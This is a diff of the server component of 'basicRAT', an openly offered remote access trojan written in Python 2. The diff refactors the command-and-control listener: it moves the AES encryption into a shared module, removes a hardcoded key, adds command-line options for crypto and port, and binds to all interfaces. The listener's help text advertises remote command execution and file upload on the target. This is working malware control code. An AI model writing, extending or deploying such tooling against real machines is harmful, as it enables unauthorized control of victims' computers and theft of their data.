@@ -1,13 +1,12 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+
+import argparse
 import readline
 import socket
 import sys
 import time
-
-from Crypto import Random
-from Crypto.Cipher import AES
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -29,44 +28,42 @@ run <command>   - Execute a command on the target.
 upload <file>   - Upload a file.
 quit            - Gracefully kill client and server.
 '''
-HOST = 'localhost'
-KEY  = '82e672ae054aa4de6f042c888111686a'
-# generate your own key with...
-# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
 
 
-def pad(s):
-    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
-
-
-def encrypt(plaintext):
-    plaintext = pad(plaintext)
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    return iv + cipher.encrypt(plaintext)
-
-
-def decrypt(ciphertext):
-    iv = ciphertext[:AES.block_size]
-    cipher = AES.new(KEY, AES.MODE_CBC, iv)
-    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-    return plaintext.rstrip(b'\0')
+def get_parser():
+    parser = argparse.ArgumentParser(description='basicRAT server')
+    parser.add_argument('-c', '--crypto',
+                        help='C2 crypto to use.',
+                        default='AES', type=str)
+    parser.add_argument('-p', '--port',
+                        help='Port to listen on.',
+                        default=1337, type=int)
+    return parser
 
 
 def main():
+    parser  = get_parser()
+    args    = vars(parser.parse_args())
+    port    = args['port']
+    crypto  = args['crypto']
+    
+    if crypto == 'AES':
+        from common import AES_encrypt as encrypt
+        from common import AES_decrypt as decrypt
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        s.bind((HOST, PORT))
+        s.bind(('0.0.0.0', port))
     except socket.error:
-        print 'Error: Unable to start server, port {} in use?'.format(PORT)
+        print 'Error: Unable to start server, port {} in use?'.format(port)
         sys.exit(1)
 
     for line in BANNER.split('\n'):
         time.sleep(0.05)
         print line
 
-    print 'basicRAT server listening on port {}...\n'.format(PORT)
+    print 'basicRAT server listening on port {}...\n'.format(port)
 
     s.listen(10)
     conn, _ = s.accept()
@@ -116,10 +113,4 @@ def main():
 
 
 if __name__ == '__main__':
-    try:
-        PORT = int(sys.argv[1])
-    except (IndexError, ValueError):
-        print 'Usage: ./basicRAT_server.py <port>'
-        sys.exit(1)
-
     main()
